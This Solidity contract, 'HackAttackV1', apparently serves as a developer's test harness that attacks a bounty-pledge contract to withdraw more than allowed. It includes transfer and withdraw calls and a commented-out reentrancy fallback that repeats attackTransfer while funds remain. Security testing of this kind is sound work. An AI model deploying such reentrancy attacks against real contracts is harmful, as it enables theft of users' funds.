// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol";
import "./libraries/Transfers.sol";
import "./IBountyPledge.sol";

/**
 * 尝试攻击目标合约，超额取款
 */
contract HackAttackV1 is Initializable, OwnableUpgradeable {
    using Transfers for address;
    using CountersUpgradeable for CountersUpgradeable.Counter;
    struct PledgeRequest {
        uint256 startTime;
        uint256 endTime;
        uint8 bountyType; //1=single/2=multiple
        string cid;
        uint256 reward;
        string rewardUnit; //赏金类型: USDT,MATIC
    }

    address private _usdk;
    address private _bountyPledge;
    CountersUpgradeable.Counter _globalIndexer;
    string private _bountyCid;
    uint256 private _amount;

    event AddressEvent(
        address indexed sender,
        uint256 indexed value,
        uint256 indexed idx
    );
    event BoolEvent(bool indexed result, uint256 indexed mark);
    event Bytes32Event(bytes32 indexed typeHash, uint256 indexed idx);
    event Uint256Event(uint256 indexed v, uint256 indexed idx);
    event BytesEvent(bytes data, uint256 indexed idx);

    function initialize(address usdk_, address bountyPldge_)
        external
        payable
        initializer
    {
        __BountyPledge_init_unchained(usdk_, bountyPldge_);
        __Ownable_init();
    }

    function __BountyPledge_init_unchained(address usdk_, address bountyPldge_)
        internal
        onlyInitializing
    {
        _usdk = usdk_;
        _bountyPledge = bountyPldge_;
    }

    function transferSolarChain(uint256 amount) public payable {
        payable(address(this)).transfer(amount);
    }

    function approve(uint256 amount) public payable {
        ERC20Upgradeable(_usdk).approve(_bountyPledge, amount);
/**
        (bool success, bytes memory returndata) = _usdk.call( abi.encodeWithSignature(
                "approve(address spender,uint256 amount)",
                _bountyPledge,
                amount
        ));

        require(success,"Attack:Fail to Approve.");

      // (bool success, bytes memory returndata) = _usdk.call( abi.encodeWithSelector(ERC20Upgradeable.transfer.selector, _bountyPledge, amount));

        emit BoolEvent(success, 2);
        emit BytesEvent(returndata, 2);
**/
    }

    //征稿
    function pledge(
        string memory cid_,
        uint256 reward_,
        string memory rewardUnit_
    ) public {
        _globalIndexer.increment();

        PledgeRequest memory req = PledgeRequest({
            startTime: block.timestamp,
            endTime: block.timestamp + 5 * 60,
            bountyType: 2, //1=single/2=multiple
            cid: cid_,
            reward: reward_,
            rewardUnit: rewardUnit_ //赏金类型: USDT,MATIC
        });
/** 
    _bountyPledge.functionDelegateCall(
                abi.encodeWithSelector(
                    IAdapter.call.selector,
                    assetIn,
                    amountIn,
                    extraNativeValue,
                    bridgeData.callData
                )
            );
*/
/**
        (bool success, bytes memory returndata) = _bountyPledge.call(
            abi.encodeWithSignature(
                "pledge2(uint256,uint256,uint8,string,uint256,string)",
                req.startTime,
                req.endTime,
                req.bountyType,
                req.cid,
                req.reward,
                req.rewardUnit
            )
        );

        emit BoolEvent(success, 2);
        emit BytesEvent(returndata, 2);

*/

        IBountyPledge(_bountyPledge).pledge2(req.startTime,
                req.endTime,
                req.bountyType,
                req.cid,
                req.reward,
                req.rewardUnit);
    }

    //攻击分账
    /**
    transfer(
        string memory bountyCid,
        address to,
        uint256 amount,
        string memory contributeCid
    )
     */
    function attackTransfer(string memory bountyCid, uint256 amount) public {
        _bountyCid = bountyCid;
        _amount = amount;
        _globalIndexer.increment();
        string memory contributeCid = string(
            abi.encodePacked("attackTransfer-", _globalIndexer.current())
        );
/**
        (bool success, bytes memory returndata) = _bountyPledge.call(
            abi.encodeWithSignature(
                "transfer(string,address,uint256,string)",
                bountyCid,
                address(this),
                amount,
                contributeCid
            )
        );
        emit BoolEvent(success, 2);
        emit BytesEvent(returndata, 2);
*/
        IBountyPledge(_bountyPledge).transfer( bountyCid,
                address(this),
                amount,
                contributeCid);

    }

    //攻击提款
    function attactWithdraw(string memory bountyCid) public {
         IBountyPledge(_bountyPledge).withdraw(bountyCid);
    }

    function withdraw(address receipt_) external {
        uint256 amount = _usdk.getBalanceWithOwner(_bountyPledge);
        _usdk.transferOut(receipt_, amount);
    }

    fallback() external payable {
        //emit AddressEvent(msg.sender, msg.value, 2);
    }

    receive() external payable {
        //emit AddressEvent(msg.sender, msg.value, 1);
    }

    /*
    fallback() external payable {
        uint256 balance = _usdk.getBalanceWithOwner(_bountyPledge);
        if (balance < 1000000){
            return ;
        }
        attackTransfer(_bountyCid,_amount);
            
        emit AddressEvent(msg.sender, msg.value, 2);
    }

    receive() external payable {
        emit AddressEvent(msg.sender, msg.value, 1);
    }
    */
}
